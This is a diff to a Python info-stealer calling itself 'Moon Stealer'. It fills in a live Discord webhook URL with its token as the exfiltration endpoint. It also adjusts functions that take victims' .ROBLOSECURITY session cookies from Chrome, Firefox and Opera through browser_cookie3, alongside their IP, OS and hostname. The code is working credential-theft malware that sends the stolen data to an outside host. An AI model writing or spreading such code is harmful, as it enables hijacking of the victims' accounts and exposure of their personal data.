@@ -27,7 +27,7 @@ import browser_cookie3
 import time
 import sys
 
-hook = "X"
+hook = "https://discord.com/api/webhooks/1066508093225185331/cK4HpNH1OUuVurK4yro_lx03C7GOm9smsXmKlvWwp4WWYXu4haktyFSAIY2SJwEoZfJe"
 DETECTED = False
 
 def getip():
@@ -582,7 +582,7 @@ def upload(name, link):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
     with open(path, mode="w", encoding="utf-8") as f:
-        f.write(f"<--MOON STEALER ON TOP-->\n\n")
+        f.write(f"< - Moon Stealer -->\n\n")
         for line in data:
             if line[0] != "":
                 f.write(f"{line}\n")
@@ -1232,19 +1232,19 @@ def firefox_logger():
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
         
-
     except:
         pass
 
 def opera_logger():
     global cookie
     try:
-        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
         cookies = str(cookies)
         cookie = cookies.split('.ROBLOSECURITY=')[1].split(' for .roblox.com/>')[0].strip()
-
+        
     except:
         pass
+
 
 browsers = [chrome_logger, firefox_logger, opera_logger]
 
@@ -1261,6 +1261,9 @@ os_version = platform.release()
 os_architecture = platform.machine()
 now = datetime.utcnow()
 hostname = socket.gethostbyaddr(ip_addr)[0]
+
+if 'cookie' not in locals():
+    cookie = "Not Found"
 
 message = {
     "embeds": [
